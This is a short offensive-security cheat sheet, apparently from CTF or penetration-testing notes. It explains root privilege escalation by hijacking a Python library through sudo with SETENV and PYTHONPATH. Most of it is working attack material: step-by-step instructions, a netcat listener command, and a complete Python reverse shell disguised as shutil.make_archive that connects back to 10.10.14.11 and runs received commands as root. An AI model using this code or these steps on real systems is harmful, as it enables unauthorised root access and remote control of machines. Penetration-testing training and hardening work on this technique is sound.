# Python privesc via Sudo SETENV

Using Python library loading to privesc when we have `Sudo` permissions with `SETENV`.  
  
1. Place the CHANGE_ME.py in /dev/shm  
2. Rename to the lib being called by whatever we can sudo to (for example shutil -> make_archive)  
3. Change the function name accordingly to above  
4. Set NC listener (I use `$ nc -lnvp <portnum>`)  
5. Call sudo with python path updated as such:  
(Example taken above with shutil)
```
$ cd /dev/shm && cat shutil.py 
#!/usr/bin/env python3
import socket
import subprocess
import os

def make_archive(dst, t, src):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("10.10.14.11", 1234))
    sock.sendall('Call-back appeared, enter command:\n~$ '.encode())
    os.dup2(sock.fileno(), 0)
    os.dup2(sock.fileno(), 1)
    os.dup2(sock.fileno(), 2)
    
    while True:
        cmd = sock.recv(4096)
        process = subprocess.Popen(["/bin/sh", "-c", cmd], stdout=subprocess.PIPE)
        stdout = process.communicate()[0].decode("utf-8").split("\n")
        data = ''
        for line in stdout:
            data += line + "\n"
        data += '~$ '
        sock.sendall(data.encode())
$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh
=> Enjoy semi-interactive root-shell.
```